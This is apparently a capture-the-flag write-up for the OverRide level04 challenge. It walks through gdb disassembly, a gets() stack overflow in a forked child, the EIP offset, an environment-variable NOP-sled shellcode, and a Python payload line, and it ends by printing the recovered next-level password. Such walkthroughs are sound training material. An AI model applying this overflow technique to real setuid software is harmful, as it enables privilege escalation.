RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04

level04@OverRide:~$ ls -l
total 8
-rwsr-s---+ 1 level05 users 7797 Sep 10  2016 level04

level04@OverRide:~$ strings level04
***
Give me some shellcode, k
child is exiting...
no exec() for you
***

level04@OverRide:~$ ./level04
Give me some shellcode, k
slsls
child is exiting...

(gdb) info function
All defined functions:

Non-debugging symbols:
0x0804845c  _init
0x080484a0  fflush
0x080484a0  fflush@plt
0x080484b0  gets
0x080484b0  gets@plt
0x080484c0  getchar
0x080484c0  getchar@plt
0x080484d0  signal
0x080484d0  signal@plt
0x080484e0  alarm
0x080484e0  alarm@plt
0x080484f0  wait
0x080484f0  wait@plt
0x08048500  puts
0x08048500  puts@plt
0x08048510  __gmon_start__
0x08048510  __gmon_start__@plt
0x08048520  kill
0x08048520  kill@plt
0x08048530  __libc_start_main
0x08048530  __libc_start_main@plt
0x08048540  prctl
0x08048540  prctl@plt
0x08048550  fork
0x08048550  fork@plt
0x08048560  __isoc99_scanf
0x08048560  __isoc99_scanf@plt
0x08048570  ptrace
0x08048570  ptrace@plt
0x08048580  _start
0x080485b0  __do_global_dtors_aux
0x08048610  frame_dummy
0x08048634  clear_stdin
0x08048657  get_unum
0x0804868f  prog_timeout
0x080486a0  enable_timeout_cons
0x080486c8  main
0x08048830  __libc_csu_init
0x080488a0  __libc_csu_fini
0x080488a2  __i686.get_pc_thunk.bx
0x080488b0  __do_global_ctors_aux
0x080488dc  _fini

*******************************************************************************

(gdb) disas clear_stdin
Dump of assembler code for function clear_stdin:
   0x08048634 <+0>:	push   %ebp
   0x08048635 <+1>:	mov    %esp,%ebp
   0x08048637 <+3>:	sub    $0x18,%esp
   0x0804863a <+6>:	movb   $0x0,-0x9(%ebp)
   0x0804863e <+10>:	jmp    0x8048641 <clear_stdin+13>
   0x08048640 <+12>:	nop
   0x08048641 <+13>:	call   0x80484c0 <getchar@plt>
   0x08048646 <+18>:	mov    %al,-0x9(%ebp)
   0x08048649 <+21>:	cmpb   $0xa,-0x9(%ebp)
   0x0804864d <+25>:	je     0x8048655 <clear_stdin+33>
   0x0804864f <+27>:	cmpb   $0xff,-0x9(%ebp)
   0x08048653 <+31>:	jne    0x8048640 <clear_stdin+12>
   0x08048655 <+33>:	leave
   0x08048656 <+34>:	ret
End of assembler dump.

(gdb) disas get_unum
Dump of assembler code for function get_unum:
   0x08048657 <+0>:	push   %ebp
   0x08048658 <+1>:	mov    %esp,%ebp
   0x0804865a <+3>:	sub    $0x28,%esp
   0x0804865d <+6>:	movl   $0x0,-0xc(%ebp)
   0x08048664 <+13>:	mov    0x804a040,%eax
   0x08048669 <+18>:	mov    %eax,(%esp)
   0x0804866c <+21>:	call   0x80484a0 <fflush@plt>
   0x08048671 <+26>:	mov    $0x8048900,%eax
   0x08048676 <+31>:	lea    -0xc(%ebp),%edx
   0x08048679 <+34>:	mov    %edx,0x4(%esp)
   0x0804867d <+38>:	mov    %eax,(%esp)
   0x08048680 <+41>:	call   0x8048560 <__isoc99_scanf@plt>
   0x08048685 <+46>:	call   0x8048634 <clear_stdin>
   0x0804868a <+51>:	mov    -0xc(%ebp),%eax
   0x0804868d <+54>:	leave
   0x0804868e <+55>:	ret
End of assembler dump.

(gdb) disas enable_timeout_cons
Dump of assembler code for function enable_timeout_cons:
   0x080486a0 <+0>:	push   %ebp
   0x080486a1 <+1>:	mov    %esp,%ebp
   0x080486a3 <+3>:	sub    $0x18,%esp
   0x080486a6 <+6>:	movl   $0x804868f,0x4(%esp)
   0x080486ae <+14>:	movl   $0xe,(%esp)
   0x080486b5 <+21>:	call   0x80484d0 <signal@plt>
   0x080486ba <+26>:	movl   $0x3c,(%esp)
   0x080486c1 <+33>:	call   0x80484e0 <alarm@plt>
   0x080486c6 <+38>:	leave
   0x080486c7 <+39>:	ret
End of assembler dump.

(gdb) disas prog_timeout
Dump of assembler code for function prog_timeout:
   0x0804868f <+0>:	push   %ebp
   0x08048690 <+1>:	mov    %esp,%ebp
   0x08048692 <+3>:	mov    $0x1,%eax
   0x08048697 <+8>:	mov    $0x1,%ebx
   0x0804869c <+13>:	int    $0x80
   0x0804869e <+15>:	pop    %ebp
   0x0804869f <+16>:	ret
End of assembler dump.

*******************************************************************************

(gdb) disas main
Dump of assembler code for function main:
   0x080486c8 <+0>:	push   %ebp
   0x080486c9 <+1>:	mov    %esp,%ebp
   0x080486cb <+3>:	push   %edi
   0x080486cc <+4>:	push   %ebx
   0x080486cd <+5>:	and    $0xfffffff0,%esp
   0x080486d0 <+8>:	sub    $0xb0,%esp
   0x080486d6 <+14>:	call   0x8048550 <fork@plt> 
   0x080486db <+19>:	mov    %eax,0xac(%esp)
   0x080486e2 <+26>:	lea    0x20(%esp),%ebx
   0x080486e6 <+30>:	mov    $0x0,%eax
   0x080486eb <+35>:	mov    $0x20,%edx
   0x080486f0 <+40>:	mov    %ebx,%edi
   0x080486f2 <+42>:	mov    %edx,%ecx
   0x080486f4 <+44>:	rep stos %eax,%es:(%edi)
   0x080486f6 <+46>:	movl   $0x0,0xa8(%esp)
   0x08048701 <+57>:	movl   $0x0,0x1c(%esp)
   0x08048709 <+65>:	cmpl   $0x0,0xac(%esp)
   0x08048711 <+73>:	jne    0x8048769 <main+161>
   0x08048713 <+75>:	movl   $0x1,0x4(%esp)
   0x0804871b <+83>:	movl   $0x1,(%esp)
   0x08048722 <+90>:	call   0x8048540 <prctl@plt>
   0x08048727 <+95>:	movl   $0x0,0xc(%esp)
   0x0804872f <+103>:	movl   $0x0,0x8(%esp)
   0x08048737 <+111>:	movl   $0x0,0x4(%esp)
   0x0804873f <+119>:	movl   $0x0,(%esp)
   0x08048746 <+126>:	call   0x8048570 <ptrace@plt>
   0x0804874b <+131>:	movl   $0x8048903,(%esp)
   0x08048752 <+138>:	call   0x8048500 <puts@plt>
   0x08048757 <+143>:	lea    0x20(%esp),%eax
   0x0804875b <+147>:	mov    %eax,(%esp)
   0x0804875e <+150>:	call   0x80484b0 <gets@plt>
   0x08048763 <+155>:	jmp    0x804881a <main+338>
   0x08048768 <+160>:	nop
   0x08048769 <+161>:	lea    0x1c(%esp),%eax
   0x0804876d <+165>:	mov    %eax,(%esp)
   0x08048770 <+168>:	call   0x80484f0 <wait@plt>
   0x08048775 <+173>:	mov    0x1c(%esp),%eax
   0x08048779 <+177>:	mov    %eax,0xa0(%esp)
   0x08048780 <+184>:	mov    0xa0(%esp),%eax
   0x08048787 <+191>:	and    $0x7f,%eax
   0x0804878a <+194>:	test   %eax,%eax
   0x0804878c <+196>:	je     0x80487ac <main+228>
   0x0804878e <+198>:	mov    0x1c(%esp),%eax
   0x08048792 <+202>:	mov    %eax,0xa4(%esp)
   0x08048799 <+209>:	mov    0xa4(%esp),%eax
   0x080487a0 <+216>:	and    $0x7f,%eax
   0x080487a3 <+219>:	add    $0x1,%eax
   0x080487a6 <+222>:	sar    %al
   0x080487a8 <+224>:	test   %al,%al
   0x080487aa <+226>:	jle    0x80487ba <main+242>
   0x080487ac <+228>:	movl   $0x804891d,(%esp)
   0x080487b3 <+235>:	call   0x8048500 <puts@plt>
   0x080487b8 <+240>:	jmp    0x804881a <main+338>
   0x080487ba <+242>:	movl   $0x0,0xc(%esp)
   0x080487c2 <+250>:	movl   $0x2c,0x8(%esp)
   0x080487ca <+258>:	mov    0xac(%esp),%eax
   0x080487d1 <+265>:	mov    %eax,0x4(%esp)
   0x080487d5 <+269>:	movl   $0x3,(%esp)
   0x080487dc <+276>:	call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:	mov    %eax,0xa8(%esp)
   0x080487e8 <+288>:	cmpl   $0xb,0xa8(%esp)
   0x080487f0 <+296>:	jne    0x8048768 <main+160>
   0x080487f6 <+302>:	movl   $0x8048931,(%esp)
   0x080487fd <+309>:	call   0x8048500 <puts@plt>
   0x08048802 <+314>:	movl   $0x9,0x4(%esp)
   0x0804880a <+322>:	mov    0xac(%esp),%eax
   0x08048811 <+329>:	mov    %eax,(%esp)
   0x08048814 <+332>:	call   0x8048520 <kill@plt>
   0x08048819 <+337>:	nop
   0x0804881a <+338>:	mov    $0x0,%eax
   0x0804881f <+343>:	lea    -0x8(%ebp),%esp
   0x08048822 <+346>:	pop    %ebx
   0x08048823 <+347>:	pop    %edi
   0x08048824 <+348>:	pop    %ebp
   0x08048825 <+349>:	ret
End of assembler dump

********************************************************************************
We can see a gets call at main+150, which is vulnerable because it copies stdin
input in a stack buffer. The problem here is that this call is only reachable by
the child process of level04, which makes it invisible with a basic gdb config.
********************************************************************************

level04@OverRide:~$ gdb ./level04

(gdb) b main
Breakpoint 1 at 0x80486cd

(gdb) r
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486cd in main ()
(gdb) si
0x080486d0 in main ()
(gdb)
0x080486d6 in main ()
(gdb)
0x08048550 in fork@plt ()
(gdb)
0x08048556 in fork@plt ()
(gdb)
0x0804855b in fork@plt ()
(gdb)
0x08048490 in ?? ()

********************************************************************************
However, a gdb setting allows us to follow children process instead of staying
on parent when the parent process calls fork.
********************************************************************************

level04@OverRide:~$ python -c "print('a' * 100)" > /tmp/full

level04@OverRide:~$ gdb ./level04

(gdb) set follow-fork-mode child

(gdb) r < /tmp/full
Starting program: /home/users/level04/level04 < /tmp/full
[New process 1761]
Give me some shellcode, k
child is exiting...
[Inferior 4 (process 1761) exited normally]

********************************************************************************
So now we can try to figure out the offset between the start of our buffer and
the eip register, in order to rewrite it with the address of an env variable
containing a shellcode, to get the permissions of level05 and get the flag.
********************************************************************************

level04@OverRide:~$ python -c "print('a' * 157)" > /tmp/full

level04@OverRide:~$ gdb ./level04

(gdb) set follow-fork-mode child

(gdb) b *main+155
Breakpoint 1 at 0x8048763

(gdb) r < /tmp/full
Starting program: /home/users/level04/level04 < /tmp/full
[New process 1840]
Give me some shellcode, k
[Switching to process 1840]

Breakpoint 1, 0x08048763 in main ()
(gdb) si
0x0804881a in main ()
(gdb)
0x0804881f in main ()
(gdb)
0x08048822 in main ()
(gdb)
0x08048823 in main ()
(gdb)
0x08048824 in main ()
(gdb)
0x08048825 in main ()
(gdb)
Cannot access memory at address 0x61616165

********************************************************************************
We just rewrited eip at buffer + 157, so now we know that the offset is 156.
Everything we have to do now is storing a nop instruction field followed by
a shellcode that cat the level05 .pass file. Then we will just have to rewrite
eip register with an address in the middle of the nops field. We will use a
python script to generate the payload. We just have to find the address of this
environment variable in the child process.
********************************************************************************

level04@OverRide:~$ env -i SHELLCODE=$(python /tmp/env_shellcode.py) gdb ./level04

(gdb) set follow-fork-mode child

(gdb) b *main+150
Breakpoint 1 at 0x804875e

(gdb) r
Starting program: /home/users/level04/level04
[New process 1924]
Give me some shellcode, k
[Switching to process 1924]

Breakpoint 1, 0x0804875e in main ()

(gdb) x/s *((char**)environ)
0xffffdb62:	 "COLUMNS=101"

(gdb)
0xffffdb6e:	 "PWD=/home/users/level04"

(gdb)
0xffffdb86:	 "LINES=21"

(gdb)
0xffffdb8f:	 "SHELLCODE=\220\220\2

********************************************************************************
The address of SHELLCODE is 0xffffdb8f. We just have to add 500 to this address
to aim for the middle of the nops field :
4294957967 + 500 = 4294958467 == 0xffffdd83.
Now we can create our payload, that will write this address in eip when gets
will be called.
********************************************************************************

level04@OverRide:~$ python -c "print('a' * 156 + '\x83\xdd\xff\xff')" > /tmp/payload

level04@OverRide:~$ env -i payload=$(python /tmp/env_shellcode.py) ./level04 < /tmp/payload
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
